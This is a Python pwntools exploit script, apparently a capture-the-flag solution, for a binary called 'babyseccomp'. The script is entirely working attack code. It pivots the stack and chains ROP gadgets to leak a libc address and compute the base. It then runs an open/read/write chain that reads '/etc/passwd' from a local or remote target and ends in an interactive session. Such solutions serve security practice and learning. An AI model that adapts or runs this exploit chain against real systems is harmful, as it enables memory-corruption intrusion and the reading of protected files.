#!/usr/bin/env python
from pwn import *
import sys,time

HOST = 'None'
PORT = None

def info(s):
	log.info(s)

def exploit(p):
	rdi=0x0000000000400b03
	rsi_r15=0x0000000000400b01
	readGot=0x601040
	readIns=0x400a83
	alarmGot=0x601038
	alarm=0x400780
	rbp=0x601090+0x10
	read=0x400790
	poprbp=0x0000000000400a01
	payload='a'*8+p64(alarmGot+8-0x18)+p64(readIns)
	p.sendline(payload)
	payload="a"*8+p64(rbp)+p64(readIns)+'\x05'
	p.send(payload)
	time.sleep(5)
	# read 0x100 bytes
	payload='a'*8+p64(rbp+0x50)+p64(rdi)+p64(rbp-8+0x60)+p64(rsi_r15)+p64(0x100)+p64(0)+p64(readIns+12)
	p.send(payload)
	# read n bytes ket qua tra ve luu trong rax
	payload="a"*0x30
	payload+=p64(rdi)+p64(0)+p64(rsi_r15)+p64(rbp+0x100)+p64(0)+p64(read)
	# goi syscall
	payload+=p64(rdi)+p64(1)+p64(rsi_r15)+p64(readGot)+p64(0)+p64(alarm)+p64(poprbp)+p64(rbp+0x200)+p64(readIns)
	p.sendline(payload)
	time.sleep(5)
	p.sendline('')
	readL=u64(p.recvuntil("\x7f").ljust(8,'\x00'))
	libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
	base=readL-libc.symbols['read']
	info("read is 0x%x\nbase is 0x%x"%(readL,base))

	# read 0x100 bytes
	info("0x%x"%(rbp+0x50))
	payload='a'*8+p64(rbp+0x50)+p64(rdi)+p64(rbp+0x200)+p64(rsi_r15)+p64(0x100)+p64(0)
	payload+=p64(readIns+12)+p64(poprbp)+p64(rbp+0x200-8)+p64(0x400A99)
	p.send(payload)
	write=base+libc.symbols['write']
	openf=base+libc.symbols['open']

	time.sleep(2)

	payload=p64(rdi)+p64(0)+p64(rsi_r15)+p64(rbp+0x300)+p64(0)+p64(read)
	payload+=p64(rdi)+p64(rbp+0x300)+p64(rsi_r15)+p64(0)+p64(rbp+0x300)+p64(openf)
	payload+=p64(rdi)+p64(3)+p64(rsi_r15)+p64(rbp+0x400)+p64(0)+p64(read)
	payload+=p64(rdi)+p64(1)+p64(rsi_r15)+p64(rbp+0x400)+p64(0)+p64(write)

	p.sendline(payload)

	p.sendline("/etc/passwd\x00")

	p.interactive()
	return

if __name__=="__main__":

	if len(sys.argv)<2:
		p=process('./babyseccomp')
		print util.proc.pidof(p)
		pause()
		exploit(p)

	else:
		p=remote(HOST,PORT)
		exploit(p)
